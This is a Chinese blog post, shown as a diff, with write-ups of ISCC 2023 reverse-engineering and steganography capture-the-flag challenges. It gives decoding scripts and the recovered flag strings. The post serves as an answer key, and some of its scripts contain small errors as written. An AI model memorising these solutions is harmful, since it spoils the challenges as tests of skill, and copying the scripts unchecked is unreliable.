+&lt;h3 id=&#34;Congratulations&#34;&gt;&lt;a href=&#34;#Congratulations&#34; class=&#34;headerlink&#34; title=&#34;Congratulations&#34;&gt;&lt;/a&gt;Congratulations&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210828.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;第41行一眼顶针，鉴定为假flag，所以不管&lt;/p&gt;
+&lt;p&gt;真正的输入在44行，接着经过了两个加密函数&lt;/p&gt;
+&lt;p&gt;第一个加密&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210829.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;凯撒加密，传入的-1是移动的位数，所以字符串在字母表中的位置整体向左移一位&lt;/p&gt;
+&lt;p&gt;第二个加密&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210836.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;是自定义加密，有三段for循环，代表三段加密&lt;/p&gt;
+&lt;p&gt;第一段所有字符串减30,&lt;/p&gt;
+&lt;p&gt;第二段将字符串的前一位减去后一位&lt;/p&gt;
+&lt;p&gt;第三段将所有字符串异或“S”&lt;/p&gt;
+&lt;p&gt;逻辑清晰，接下来写脚本&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;#include&amp;lt;stdio.h&amp;gt;
+void re(char *a1, char *a2, int a3) &amp;#123;
+    int k,j,i,p;
+    for (k = a3 - 2; k &amp;gt;= 0; --k) &amp;#123;
+        a1[k] ^= *(a2 + 1);
+    &amp;#125;
+    for (j = a3 - 2; j &amp;gt;= 0; --j) &amp;#123;
+        a1[j] += a1[j+1];
+    &amp;#125;
+    for (p = a3 - 1; p &amp;gt;= 0; --p) &amp;#123;
+        a1[p] += 30;
+    &amp;#125;
+    
+  char v4[36]=&amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;;
+  char v5[32]=&amp;quot;abcdefghijklmnopqrstuvwxyz&amp;quot;;
+
+  for ( i = 0; ; ++i )
+  &amp;#123;
+    if ( !*(i + a1) )
+      break;
+    if ( *(i + a1) &amp;lt; 97 || *(i + a1) &amp;gt; 122 )
+    &amp;#123;
+      if ( *(i + a1) &amp;gt;= 65 &amp;amp;&amp;amp; *(i + a1) &amp;lt;= 90 )
+        *(i + a1) = v4[(*(i + a1) - 65 + 1) % 26];
+    &amp;#125;
+    else
+    &amp;#123;
+      *(i + a1) = v5[(*(i + a1) - 97 + 1) % 26];
+    &amp;#125;
+  &amp;#125;
+&amp;#125;
+
+
+int main()
+&amp;#123;
+    char v9[26];
+ v9[0] = -91;
+  v9[1] = 67;
+  v9[2] = 83;
+  v9[3] = -108;
+  v9[4] = 126;
+  v9[5] = 89;
+  v9[6] = -76;
+  v9[7] = 107;
+  v9[8] = -92;
+  v9[9] = -26;
+  v9[10] = 101;
+  v9[11] = 80;
+  v9[12] = -113;
+  v9[13] = 116;
+  v9[14] = -70;
+  v9[15] = -65;
+  v9[16] = -67;
+  v9[17] = 17;
+  v9[18] = -90;
+  v9[19] = -100;
+  v9[20] = 28;
+  v9[21] = -79;
+  v9[22] = -79;
+  v9[23] = 19;
+  v9[24] = -9;
+  v9[25] = 95;
+      char v6[]=&amp;quot;ISCC&amp;quot;;
+      int v8=26;
+    re(v9,v6,v8);
+    int i;
+     for (i = 0; i &amp;lt; 26; i++) &amp;#123;
+
+        printf(&amp;quot;%c&amp;quot;, v9[i]);
+    &amp;#125;
+    return 0;
+ &amp;#125; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出为：ISCC{OE]%.zD@e&amp;#x3D;Uia8Du%Db!}&lt;/p&gt;
+&lt;h3 id=&#34;变形记&#34;&gt;&lt;a href=&#34;#变形记&#34; class=&#34;headerlink&#34; title=&#34;变形记&#34;&gt;&lt;/a&gt;变形记&lt;/h3&gt;&lt;p&gt;说实话这道题代码分析还挺困难的，无用代码很多，最后还是沉下心慢慢分析才有了头绪。因为代码很长，就只分析关键代码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213833.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;图示代码实现了遍历输入寻找相邻的相同字符，如果相同，则记录，最后将相同字符转换为相同字符的个数，替换原来的字符串&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213833.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里有个base码，本来以为对base码也有加密，但是看到字符串开头有两个等号，就先猜是不是把编码倒过来解密就可以了，结果正确&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213839.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以脚本如下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import base64
+
+def reverse_string(string):
+    return string[::-1]
+def base64_decode(string):
+    return base64.b64decode(string).decode(&amp;#39;utf-8&amp;#39;)
+
+user_input = input(&amp;quot;输入：&amp;quot;)
+
+reversed_string = reverse_string(user_input)
+print(&amp;quot;逆序：&amp;quot;, reversed_string)
+
+decoded_string = base64_decode(reversed_string)
+print(decoded_string)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;得到y3QvyUyQsVszsyv2ays，对其进行变换
+得到flag：ISCC&amp;#123;yyyQvyUyQsVszsyvvays&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;Convert&#34;&gt;&lt;a href=&#34;#Convert&#34; class=&#34;headerlink&#34; title=&#34;Convert&#34;&gt;&lt;/a&gt;Convert&lt;/h3&gt;&lt;p&gt;这道题只需要理清字符串变换的逻辑就行了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242219547.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这道题只有一个加密函数sub_488B0A&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242219550.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里的加密逻辑也很简单，首先让字符串遍历减去32在加上遍历值&lt;/p&gt;
+&lt;p&gt;接着是一个自定义加密，将“ISCC”作为密钥传入，这里写脚本需要倒着写，因为第21行的加密使用的是第19行加密的数据，所以解密需要加密的数据&lt;/p&gt;
+&lt;p&gt;脚本如下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+void re(char *a1, char *a2, int a3) &amp;#123;
+    int i, j;
+    for (j = 3; j &amp;gt;=0 ; j--) &amp;#123;
+        *(a1 + j + 16) -= (*(a2 + j))/ 5;
+        *(a1 + j + 12) -= *(a1 + j + 4);
+        *(a1 + j + 8) -= 2 * j;
+        *(a1 + j + 4) -= *(a2 + j) % 5;
+        *(a1 + j) -= j ^ -(*(a2 + j) % 4);
+    &amp;#125;
+        for (i = 0; i &amp;lt;=a3-1; i++) &amp;#123;
+        *(a1 + i) -= i;
+        *(a1 + i) += 32;
+    &amp;#125;
+&amp;#125;
+
+int main() &amp;#123;
+ Char	a1[]= &amp;#123;0x28,0x30,0x24,0x24,0x62,0x2E,0x1A,0x0A,0x1C,0x48,0x2E,0x3A,0x93,0x5B,0x48,0x50,0x3E,0x42,0x2A,0x36,0x3B,0x28,0x73&amp;#125;;
+    char a2[] = &amp;quot;ISCC&amp;quot;;
+    int a3 = 23;
+    int i;
+    re(a1, a2, a3);
+    for (i = 0; i &amp;lt; 23; i++) &amp;#123;
+
+        printf(&amp;quot;%c&amp;quot;, a1[i]);
+    &amp;#125;
+    return 0;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;Pull-the-Wool-Over-People’s-Eyes&#34;&gt;&lt;a href=&#34;#Pull-the-Wool-Over-People’s-Eyes&#34; class=&#34;headerlink&#34; title=&#34;Pull the Wool Over People’s Eyes&#34;&gt;&lt;/a&gt;Pull the Wool Over People’s Eyes&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242221641.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;程序使用Src当密钥与输入进行异或，Src的获取与44行函数有关，进入函数&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242221643.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以发现密钥，但是注意v18经过了一次冒泡排序变换，所以我们需要先获取冒泡排序后的输出&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;def bubble_sort(string):
+    n = len(string)
+    # 将字符串转换为字符数组
+    arr = list(string)
+
+    # 冒泡排序
+    for i in range(n - 1):
+        for j in range(n - i - 1):
+            if ord(arr[j]) &amp;gt; ord(arr[j + 1]):
+                arr[j], arr[j + 1] = arr[j + 1], arr[j]
+
+    # 将排序后的字符数组转换回字符串
+    sorted_string = &amp;#39;&amp;#39;.join(arr)
+    return sorted_string
+
+
+input_string = &amp;quot;YouAresoClever&amp;quot;
+sorted_string = bubble_sort(input_string)
+print(sorted_string)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;此脚本会输出：ACYeeeloorrsuv，所以密钥为ISCC{ACYeeeloorrsuv}&lt;/p&gt;
+&lt;p&gt;这里的01是密文转换为2进制的形式，按照8bit一个字节转换，最后异或密钥得到flag&lt;br&gt;脚本如下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;binary_string = &amp;quot;0000000000000000000000000000000000000000001010010000000100110000010101010011011000011100001101000010100100110101010000000010011000110111010010100010011000000000&amp;quot;
+byte_list = [int(binary_string[i : i + 8], 2) for i in range(0, len(binary_string), 8)]
+secret_key = &amp;quot;ISCC&amp;#123;ACYeeeloorrsuv&amp;#125;&amp;quot;
+flag = &amp;quot;&amp;quot;
+for i in range(len(byte_list)):
+    flag += chr(ord(secret_key[i]) ^ byte_list[i])
+print(flag)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到flag：ISCC{hBi0SyXFZ2TD?P}&lt;/p&gt;
+&lt;h3 id=&#34;《狂彪》-1&#34;&gt;&lt;a href=&#34;#《狂彪》-1&#34; class=&#34;headerlink&#34; title=&#34;《狂彪》-1&#34;&gt;&lt;/a&gt;《狂彪》-1&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222653.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Get_flag需要三个参数，&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222653.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;之后输出按照这种标准输出就可以&lt;/p&gt;
+&lt;p&gt;脚本&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;mod = 46
+m = 0x50d7c32f4a659
+n = &amp;quot;4-chloroisatin&amp;quot;
+p = &amp;quot;Ammosamide B&amp;quot;
+mod_out = (int((m % 100000) % mod)) ^ (mod * (int)(m % 100000))
+flag = &amp;quot;ISCC&amp;#123;&amp;quot; + str(mod_out) + &amp;quot;_&amp;quot; + n + &amp;quot;_&amp;quot; + str(m) + &amp;quot;_&amp;quot; + p + &amp;quot;&amp;#125;&amp;quot;
+print(flag)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到flag：ISCC{2449069_4-chloroisatin_1422201965553241_Ammosamide B}&lt;/p&gt;
+&lt;h3 id=&#34;CrackMePlease&#34;&gt;&lt;a href=&#34;#CrackMePlease&#34; class=&#34;headerlink&#34; title=&#34;CrackMePlease&#34;&gt;&lt;/a&gt;CrackMePlease&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222639.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;程序实现了一个自解密结构，所以我们需要将程序运行到第64行，就可以得到flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222645.jpg&#34; alt=&#34;IMG_256&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里flag多了“{EASY”是因为在第60行调用了sub_48784B函数，将传入的“EASY”赋给了输入，所以去掉。 &lt;/p&gt;
+&lt;p&gt;得到flag:ISCC{P-*BUt&amp;gt;n} &lt;/p&gt;
+&lt;h2 id=&#34;Misc&#34;&gt;&lt;a href=&#34;#Misc&#34; class=&#34;headerlink&#34; title=&#34;Misc&#34;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id=&#34;好看的维吾尔族小姐姐&#34;&gt;&lt;a href=&#34;#好看的维吾尔族小姐姐&#34; class=&#34;headerlink&#34; title=&#34;好看的维吾尔族小姐姐&#34;&gt;&lt;/a&gt;好看的维吾尔族小姐姐&lt;/h3&gt;&lt;p&gt;16进制编辑器修改图片高度&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251118115.png&#34; alt=&#34;image-20230525111822991&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是DM码，水平翻转后识别信息&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;;521#&amp;amp;;33#&amp;amp;;101#&amp;amp;;011#&amp;amp;;111#&amp;amp;;001#&amp;amp;;801#&amp;amp;;801#&amp;amp;;101#&amp;amp;;911#&amp;amp;;59#&amp;amp;;611#&amp;amp;;501#&amp;amp;;59#&amp;amp;;611#&amp;amp;;111#&amp;amp;;301#&amp;amp;;59#&amp;amp;;711#&amp;amp;;111#&amp;amp;;121#&amp;amp;;321#&amp;amp;;76#&amp;amp;;76#&amp;amp;;38#&amp;amp;;37#&amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到的是翻转后的Unicode的编码，这里翻转后解码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251129578.png&#34; alt=&#34;image-20230525112957478&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;人生之路&#34;&gt;&lt;a href=&#34;#人生之路&#34; class=&#34;headerlink&#34; title=&#34;人生之路&#34;&gt;&lt;/a&gt;人生之路&lt;/h3&gt;&lt;p&gt;压缩包的密码：人生之路.jpeg&lt;/p&gt;
+&lt;p&gt;打开flag.txt&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251133105.png&#34; alt=&#34;image-20230525113336977&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;jFgOyFgOjF gFyOjFyOgF gFyFjF gFyFjF gOyOgOjOyOjO gFyFjFcOgO yFcOjOjcOygOyjO gFcFjFyFyjO gFyFjFcOgO yOyjOjcOcO yOyjOjcOcO yFcOjFcOyF gFcFjFyFyjO yFjFcFgF cFyjOcjOyF yOyjOjcOcO yFjFcFgF yFcFjFyOgFjFyO yjFcgOcjOygF jFgFyFgOjF jOyOjOgOyOgO 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import string
+c=&amp;quot;&amp;quot;.strip()
+a=c.split(&amp;quot; &amp;quot;)
+a=list(a[0])
+p=0
+for i in a:
+    if i in string.ascii_lowercase:
+        i=chr((ord(i)-97+p)%26+97)
+        while i not in &amp;quot;wasd&amp;quot;:
+            i=chr((ord(i)-97+1)%26+97)
+            p+=1
+    elif i in string.ascii_uppercase:
+        i=chr((ord(i)-65+p)%26+65)
+        while i not in &amp;quot;ZI&amp;quot;:
+            i=chr((ord(i)-65+1)%26+65)
+            p+=1
+a=list(c)
+for i in range(len(a)):
+    if a[i]==&amp;quot; &amp;quot;:
+        pass
+    else:
+        if a[i] in string.ascii_lowercase:
+            a[i]=chr((ord(a[i])-97+p)%26+97)
+        elif a[i] in string.ascii_uppercase:
+            a[i]=chr((ord(a[i])-65+p)%26+65)
+a=&amp;quot;&amp;quot;.join(a)
+a=a.split(&amp;quot; &amp;quot;)
+map=&amp;#123;
+    &amp;quot;saIsIwIdIwaIsdIsI&amp;quot;: &amp;quot;A&amp;quot;,
+    &amp;quot;sZwZdZsZaZdZsZaZ&amp;quot;: &amp;quot;B&amp;quot;,
+    &amp;quot;aZsZdZ&amp;quot;: &amp;quot;C&amp;quot;,
+    &amp;quot;sZwZdZsZaZ&amp;quot;: &amp;quot;D&amp;quot;,
+    &amp;quot;dZaZsIdZaZsIdZ&amp;quot;: &amp;quot;E&amp;quot;,
+    &amp;quot;dZaZsZaIdZ&amp;quot;: &amp;quot;F&amp;quot;,
+    &amp;quot;aZsZdZwIaI&amp;quot;: &amp;quot;G&amp;quot;,
+    &amp;quot;sZwIdZwIsZ&amp;quot;: &amp;quot;H&amp;quot;,
+    &amp;quot;dZaIsZaIdZ&amp;quot;: &amp;quot;I&amp;quot;,
+    &amp;quot;dZaIsZaI&amp;quot;: &amp;quot;J&amp;quot;,
+    &amp;quot;sZwIdIdwIsaIsdI&amp;quot;: &amp;quot;K&amp;quot;,
+    &amp;quot;sZdZ&amp;quot;: &amp;quot;L&amp;quot;,
+    &amp;quot;wZsdIwdIsZ&amp;quot;: &amp;quot;M&amp;quot;,
+    &amp;quot;wZsdZwZ&amp;quot;: &amp;quot;N&amp;quot;,
+    &amp;quot;sZdZwZaZ&amp;quot;: &amp;quot;O&amp;quot;,
+    &amp;quot;sZwZdZsIaZ&amp;quot;: &amp;quot;P&amp;quot;,
+    &amp;quot;aZwZdZsZsdI&amp;quot;: &amp;quot;Q&amp;quot;,
+    &amp;quot;sZwZdZsIaZdZsI&amp;quot;: &amp;quot;R&amp;quot;,
+    &amp;quot;aZsIdZsIaZ&amp;quot;: &amp;quot;S&amp;quot;,
+    &amp;quot;dZaIsZ&amp;quot;: &amp;quot;T&amp;quot;,
+    &amp;quot;sZdZwZ&amp;quot;: &amp;quot;U&amp;quot;,
+    &amp;quot;sIsdIdwIwI&amp;quot;: &amp;quot;V&amp;quot;,
+    &amp;quot;sdZwdZsdZwdZ&amp;quot;: &amp;quot;W&amp;quot;,
+    &amp;quot;sdZwaIwdIsaZ&amp;quot;: &amp;quot;X&amp;quot;,
+    &amp;quot;sdIwdIsaIsI&amp;quot;: &amp;quot;Y&amp;quot;,
+    &amp;quot;dZsaZdZ&amp;quot;: &amp;quot;Z&amp;quot;,
+    &amp;quot;aIsIaIdIsIdI&amp;quot;: &amp;quot;&amp;#123;&amp;quot;,
+    &amp;quot;dIsIdIaIsIaI&amp;quot;: &amp;quot;&amp;#125;&amp;quot;
+&amp;#125;
+for i in a:
+    print(map[i],end=&amp;#39;&amp;#39;)
+print()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251134034.png&#34; alt=&#34;image-20230525113443935&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;汤姆历险记&#34;&gt;&lt;a href=&#34;#汤姆历险记&#34; class=&#34;headerlink&#34; title=&#34;汤姆历险记&#34;&gt;&lt;/a&gt;汤姆历险记&lt;/h3&gt;&lt;p&gt;解压文件后用foremost分离图片得到一个压缩包&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251138690.png&#34; alt=&#34;image-20230525113805591&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解压发现有密码，去图片中寻找密码，在文件最后发现一串字符串&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;alphabet = &amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;amp;*()_+- =\\&amp;#123;\\&amp;#125;[]&amp;quot;
+strings = open(&amp;#39;./flag.txt&amp;#39;).read()
+
+result = &amp;#123;&amp;#125;
+for i in alphabet:
+    counts = strings.count(i)
+    i = &amp;#39;&amp;#123;0&amp;#125;&amp;#39;.format(i)
+    result[i] = counts
+
+res = sorted(result.items(),key=lambda item:item[1],reverse=True)
+for data in res:
+    print(data)
+
+for i in res:
+    flag = str(i[0])
+    print(flag[0],end=&amp;quot;&amp;quot;)
+    #&amp;#123;yasuobpwrd91702!@$%^&amp;amp;*&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;字频统计后得到密码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251150808.png&#34; alt=&#34;image-20230525115028689&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解压后得到一段文本&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251153349.png&#34; alt=&#34;image-20230525115302186&#34;&gt;&lt;/p&gt;
+&lt;p&gt;根据行距解摩斯&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;..-.-..-..-.-..--.-
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251208633.png&#34; alt=&#34;image-20230525120850474&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后用dictionary中对应的字符串替换&lt;/p&gt;
+&lt;h3 id=&#34;菜鸟黑客1&#34;&gt;&lt;a href=&#34;#菜鸟黑客1&#34; class=&#34;headerlink&#34; title=&#34;菜鸟黑客1&#34;&gt;&lt;/a&gt;菜鸟黑客1&lt;/h3&gt;&lt;p&gt;这里发现其是一个镜像文件，这里通过R-studio加载后再桌面找到了flag.txt&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251302394.png&#34; alt=&#34;image-20230525130216242&#34;&gt;&lt;/p&gt;
+&lt;p&gt;是一个des，用题目给到的key解密&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251303783.png&#34; alt=&#34;image-20230525130351623&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;mystery-of-bits&#34;&gt;&lt;a href=&#34;#mystery-of-bits&#34; class=&#34;headerlink&#34; title=&#34;mystery of bits&#34;&gt;&lt;/a&gt;mystery of bits&lt;/h3&gt;&lt;p&gt;更改图片高度&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251800360.png&#34; alt=&#34;image-20230525180010008&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用stegSolve打开&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251906656.png&#34; alt=&#34;image-20230525190612575&#34;&gt;&lt;/p&gt;
+&lt;p&gt;翻转一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251916588.png&#34; alt=&#34;image-20230525191645533&#34;&gt;&lt;/p&gt;
+&lt;p&gt;ysafao245hfdisi，解压后得到一个wav文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251934620.png&#34; alt=&#34;image-20230525193428558&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里分解得到一串01，很明显是像素位&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;0000000000000000000000000000000011111110101010111111101111111001000001011101011100000100000100101110101111000111110010111010010111010101000000101001011101001011101010110100101000101110100100000100010110000001010000010011111110101010101010101111111000000000010011001101000000000000010101101010101010111110111110011110000111111100010100101110000010111010010110110101101111000011100000011100000111000001110001001011101001011010010110100000000110100000111000001110000000001011101001011010010110100100010001101001100111011101010100001010011111010110011101001111100000011001100100001101100101000010100010011000010000011000100001011100001011001110110110100100101011100111110101111111101100000000000100001010110100010001001111111001000110010010101010000100000101101111001001000111110010111010011101110101111110101001011101010111011001101110101000101110100010111010101110111010010000010110011001000110011110001111111000010001000010010100000000000000000000000000000000000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;转二维码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251946238.png&#34; alt=&#34;image-20230525194647169&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251947377.png&#34; alt=&#34;image-20230525194716316&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;通信方式&#34;&gt;&lt;a href=&#34;#通信方式&#34; class=&#34;headerlink&#34; title=&#34;通信方式&#34;&gt;&lt;/a&gt;通信方式&lt;/h3&gt;&lt;p&gt;用au打开发现有两个声道，这里计算一下左右声道的差值&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import wave
+
+# 打开wav文件
+wav_file = wave.open(&amp;#39;telegram2wechat.wav&amp;#39;, &amp;#39;r&amp;#39;)
+
+# 获取声道数和采样率
+num_channels = wav_file.getnchannels()
+sample_rate = wav_file.getframerate()
+
+# 读取所有采样点
+frames = wav_file.readframes(-1)
+
+# 关闭文件
+wav_file.close()
+
+# 将所有数据转换为整数
+samples = list(map(
+    lambda x: int.from_bytes(x, byteorder=&amp;#39;little&amp;#39;, signed=True),
+    zip(frames[0::2], frames[1::2])
+))
+
+# 分离左右声道
+left_channel = samples[::num_channels]
+right_channel = samples[1::num_channels]
+
+# 计算左右声道的差值
+diff = [left - right for left, right in zip(left_channel, right_channel)]
+
+# 输出差值
+print(diff)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251238553.png&#34; alt=&#34;image-20230525123810382&#34;&gt;&lt;/p&gt;
+&lt;p&gt;中间有段不一样的，这里提取出来，1转成0，2替换成1，把逗号和空格都去了&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import wave
+
+# 打开wav文件
+wav_file = wave.open(&amp;#39;telegram2wechat.wav&amp;#39;, &amp;#39;r&amp;#39;)
+
+# 获取声道数和采样率
+num_channels = wav_file.getnchannels()
+sample_rate = wav_file.getframerate()
+
+# 读取所有采样点
+frames = wav_file.readframes(-1)
+
+# 关闭文件
+wav_file.close()
+
+# 将所有数据转换为整数
+samples = list(map(
+    lambda x: int.from_bytes(x, byteorder=&amp;#39;little&amp;#39;, signed=True),
+    zip(frames[0::2], frames[1::2])
+))
+
+# 分离左右声道
+left_channel = samples[::num_channels]
+right_channel = samples[1::num_channels]
+
+# 计算左右声道的差值
+diff = [left - right for left, right in zip(left_channel, right_channel)]
+
+p = [d for d in diff if d in [1, 2]]
+
+with open(&amp;#39;output.txt&amp;#39;, &amp;#39;w&amp;#39;) as f:
+    f.write(str(p))
+
+with open(&amp;#39;output.txt&amp;#39;, &amp;#39;r&amp;#39;) as f:
+    content = f.read().replace(&amp;#39;,&amp;#39;, &amp;#39;&amp;#39;).replace(&amp;#39; &amp;#39;, &amp;#39;&amp;#39;)
+    content = content.replace(&amp;#39;1&amp;#39;, &amp;#39;0&amp;#39;).replace(&amp;#39;2&amp;#39;, &amp;#39;1&amp;#39;)
+    # print(content)
+    binary_str=str(content)
+
+print(binary_str)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251241865.png&#34; alt=&#34;image-20230525124129737&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251244726.png&#34; alt=&#34;image-20230525124427569&#34;&gt;&lt;/p&gt;
+&lt;p&gt;中文电码在线转一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251252689.png&#34; alt=&#34;image-20230525125205545&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里写脚本对照一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251254355.png&#34; alt=&#34;image-20230525125425194&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;菜鸟黑客-2&#34;&gt;&lt;a href=&#34;#菜鸟黑客-2&#34; class=&#34;headerlink&#34; title=&#34;菜鸟黑客-2&#34;&gt;&lt;/a&gt;菜鸟黑客-2&lt;/h3&gt;&lt;p&gt;使用volatility工具将jpg文件分离&lt;/p&gt;
